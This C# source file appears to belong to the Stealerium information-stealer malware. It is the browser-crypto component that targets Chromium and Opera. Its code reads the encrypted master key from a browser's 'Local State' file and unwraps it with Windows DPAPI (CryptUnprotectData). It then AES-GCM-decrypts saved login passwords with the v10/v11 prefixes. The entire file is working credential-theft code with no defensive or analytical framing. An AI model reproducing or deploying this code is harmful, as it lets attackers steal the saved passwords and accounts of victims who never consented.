using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium;

internal sealed class Crypto
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct CryptprotectPromptstruct
	{
		public int cbSize;

		public int dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	private struct DataBlob
	{
		public int cbData;

		public IntPtr pbData;
	}

	private static string _sPrevBrowserPath = "";

	private static byte[] _sPrevMasterKey = new byte[0];

	[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

	public static byte[] DpapiDecrypt(byte[] bCipher, byte[] bEntropy = null)
	{
		DataBlob pPlainText = default(DataBlob);
		DataBlob pCipherText = default(DataBlob);
		DataBlob pEntropy = default(DataBlob);
		CryptprotectPromptstruct cryptprotectPromptstruct = default(CryptprotectPromptstruct);
		cryptprotectPromptstruct.cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct));
		cryptprotectPromptstruct.dwPromptFlags = 0;
		cryptprotectPromptstruct.hwndApp = IntPtr.Zero;
		cryptprotectPromptstruct.szPrompt = null;
		CryptprotectPromptstruct pPrompt = cryptprotectPromptstruct;
		string pszDescription = string.Empty;
		try
		{
			try
			{
				if (bCipher == null)
				{
					bCipher = Array.Empty<byte>();
				}
				pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
				pCipherText.cbData = bCipher.Length;
				Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
			}
			catch
			{
			}
			try
			{
				if (bEntropy == null)
				{
					bEntropy = Array.Empty<byte>();
				}
				pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
				pEntropy.cbData = bEntropy.Length;
				Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);
			}
			catch
			{
			}
			CryptUnprotectData(ref pCipherText, ref pszDescription, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
			byte[] array = new byte[pPlainText.cbData];
			Marshal.Copy(pPlainText.pbData, array, 0, pPlainText.cbData);
			return array;
		}
		catch
		{
		}
		finally
		{
			if (pPlainText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pPlainText.pbData);
			}
			if (pCipherText.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pCipherText.pbData);
			}
			if (pEntropy.pbData != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(pEntropy.pbData);
			}
		}
		return Array.Empty<byte>();
	}

	public static byte[] GetMasterKey(string sLocalStateFolder)
	{
		string text = sLocalStateFolder;
		text = ((!text.Contains("Opera")) ? (text + "\\Local State") : (text + "\\Opera Stable\\Local State"));
		byte[] array = new byte[0];
		if (!File.Exists(text))
		{
			return null;
		}
		if (text != _sPrevBrowserPath)
		{
			_sPrevBrowserPath = text;
			foreach (Match item in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text)))
			{
				if (item.Success)
				{
					array = Convert.FromBase64String(item.Groups[1].Value);
				}
			}
			byte[] array2 = new byte[array.Length - 5];
			Array.Copy(array, 5, array2, 0, array.Length - 5);
			try
			{
				_sPrevMasterKey = DpapiDecrypt(array2);
				return _sPrevMasterKey;
			}
			catch
			{
				return null;
			}
		}
		return _sPrevMasterKey;
	}

	public static string GetUtf8(string sNonUtf8)
	{
		try
		{
			byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
			return Encoding.UTF8.GetString(bytes);
		}
		catch
		{
			return sNonUtf8;
		}
	}

	public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
	{
		byte[] array = new byte[12];
		Array.Copy(bEncryptedData, 3, array, 0, 12);
		try
		{
			byte[] array2 = new byte[bEncryptedData.Length - 15];
			Array.Copy(bEncryptedData, 15, array2, 0, bEncryptedData.Length - 15);
			byte[] array3 = new byte[16];
			byte[] array4 = new byte[array2.Length - array3.Length];
			Array.Copy(array2, array2.Length - 16, array3, 0, 16);
			Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
			return new CAesGcm().Decrypt(bMasterKey, array, null, array4, array3);
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
	}

	public static string EasyDecrypt(string sLoginData, string sPassword)
	{
		if (!sPassword.StartsWith("v10") && !sPassword.StartsWith("v11"))
		{
			return Encoding.Default.GetString(DpapiDecrypt(Encoding.Default.GetBytes(sPassword)));
		}
		byte[] masterKey = GetMasterKey(Directory.GetParent(sLoginData)!.Parent!.FullName);
		return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
	}

	public static string BrowserPathToAppName(string sLoginData)
	{
		if (sLoginData.Contains("Opera"))
		{
			return "Opera";
		}
		return sLoginData.Replace(Paths.Lappdata, "").Split(new char[1] { '\\' })[1];
	}
}
